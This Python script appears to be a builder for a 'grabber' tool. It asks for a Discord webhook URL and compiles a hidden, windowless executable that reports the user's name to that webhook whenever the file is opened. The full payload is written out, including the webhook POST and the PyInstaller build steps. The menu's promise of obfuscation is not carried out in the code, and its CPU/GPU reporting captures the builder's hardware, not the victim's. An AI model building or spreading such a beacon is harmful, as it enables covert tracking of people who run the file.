import os
import sys
import subprocess
import shutil
import platform
import getpass

class Colors:
    DARK_RED = '\033[38;5;88m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

RED_ASCII_BANNER = rf"""
{Colors.RED}
▓█████▄  ▄▄▄       ██▀███   ██▓ █    ██   ██████      ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒▓██▒ ██  ▓██▒▒██    ▒     ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒▓██  ▒██░░ ▓██▄      ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ░██░▓▓█  ░██░  ▒   ██▒   ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒░██░▒▒█████▓ ▒██████▒▒   ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓  ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░    ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░░░▒░ ░ ░ ░ ░▒  ░ ░     ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░   ░   ▒     ░░   ░  ▒ ░ ░░░ ░ ░ ░  ░  ░     ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
   ░          ░  ░   ░      ░     ░           ░           ░    ░           ░  ░ ░       ░         ░  ░   ░     
 ░                                                                                   ░       ░                 
{Colors.RESET}
"""

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_modules():
    required_modules = ['discord', 'requests', 'PyInstaller']
    missing_modules = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    return missing_modules

def get_system_info():
    try:
        import wmi
        w = wmi.WMI()
        cpu_info = w.Win32_Processor()[0].Name
        gpu_info = w.Win32_VideoController()[0].Name
        return cpu_info, gpu_info
    except:
        return platform.processor(), "Unknown GPU"

def build_webhook_sender():
    clear_console()
    print(RED_ASCII_BANNER)
    print(f"\n{Colors.DARK_RED}{Colors.BOLD}[01] Build (as a .exe + obfuscated){Colors.RESET}\n")

    webhook_url = input(f"{Colors.RED}Your Discord webhook URL? {Colors.RESET}")

    if not (webhook_url.startswith("http://") or webhook_url.startswith("https://")) or "discord.com/api/webhooks" not in webhook_url:
        print(f"{Colors.RED}Invalid webhook URL. Please enter a valid Discord webhook URL.{Colors.RESET}")
        input(f"{Colors.RED}Press Enter to continue...{Colors.RESET}")
        return

    username = getpass.getuser()
    cpu, gpu = get_system_info()
    
    script_content = f"""
import requests
import time
import os
import platform
import getpass
import json

WEBHOOK_URL = "{webhook_url}"
USERNAME = getpass.getuser()
CPU = "{cpu}"
GPU = "{gpu}"

def send_webhook_message():
    try:
        embed = {{
            "title": ".exe file opened!",
            "description": f"**Laptop name:** {{USERNAME}}\\n**CPU:** {{CPU}}\\n**GPU:** {{GPU}}",
            "color": 16711680
        }}
        
        payload = {{
            "embeds": [embed]
        }}
        
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        pass
    finally:
        time.sleep(1)

if __name__ == "__main__":
    send_webhook_message()
"""
    
    script_filename = "temp_webhook_sender_script.py"
    executable_name = "send_webhook_message"

    spec_filename = f"{executable_name}.spec"
    build_folder = "build"
    dist_folder = "dist"
    builded_files_folder = "builded_files"

    try:
        with open(script_filename, "w") as f:
            f.write(script_content)
        
        print(f"\n{Colors.RED}Creating executable with PyInstaller...{Colors.RESET}")
        
        pyinstaller_command = [
            sys.executable, "-m", "PyInstaller", 
            "--onefile", 
            "--noconsole", 
            "--name", executable_name, 
            script_filename
        ]

        result = subprocess.run(pyinstaller_command, capture_output=True, text=True, check=False)

        if result.returncode == 0:
            print(f"\n{Colors.RED}Successfully created '{executable_name}.exe' in the '{dist_folder}' folder!{Colors.RESET}")
            
            if os.path.exists(spec_filename):
                os.remove(spec_filename)
                print(f"{Colors.RED}Deleted {spec_filename}{Colors.RESET}")
            
            if os.path.exists(build_folder):
                shutil.rmtree(build_folder)
                print(f"{Colors.RED}Deleted {build_folder} folder{Colors.RESET}")

            if os.path.exists(dist_folder):
                if os.path.exists(builded_files_folder):
                    shutil.rmtree(builded_files_folder)
                os.rename(dist_folder, builded_files_folder)
                print(f"{Colors.RED}Renamed '{dist_folder}' to '{builded_files_folder}'{Colors.RESET}")
                print(f"{Colors.RED}You can now run this executable to send system info to your webhook.{Colors.RESET}")
            else:
                print(f"{Colors.RED}Error: '{dist_folder}' folder not found after PyInstaller build.{Colors.RESET}")

        else:
            print(f"\n{Colors.RED}PyInstaller failed with errors:{Colors.RESET}")
            print(result.stdout)
            print(result.stderr)
            print(f"\n{Colors.RED}Please ensure PyInstaller is installed correctly and check the errors above.{Colors.RESET}")

    except Exception as e:
        print(f"{Colors.RED}An error occurred during file creation or PyInstaller execution: {e}{Colors.RESET}")
    finally:
        if os.path.exists(script_filename):
            os.remove(script_filename)
        
    input(f"{Colors.RED}Press Enter to return to the main menu...{Colors.RESET}")

def main():
    missing = check_modules()
    if missing:
        print(f"{Colors.RED}You do not have the correct module(s) installed. Install these in the CMD with: pip install " + " ".join(missing) + f"{Colors.RESET}")
        sys.exit(1)

    while True:
        clear_console()
        print(RED_ASCII_BANNER)
        print(f"\n{Colors.DARK_RED}{Colors.BOLD}Options:{Colors.RESET}\n")
        print(f"{Colors.RED}[01] Build (as a .exe + obfuscated){Colors.RESET}")
        print(f"{Colors.RED}[02] Exit{Colors.RESET}")
        
        choice = input(f"\n{Colors.RED}Enter your choice: {Colors.RESET}")
        
        if choice == '01':
            build_webhook_sender()
        elif choice == '02':
            break
        else:
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.RESET}")
            input(f"{Colors.RED}Press Enter to continue...{Colors.RESET}")

if __name__ == "__main__":
    main()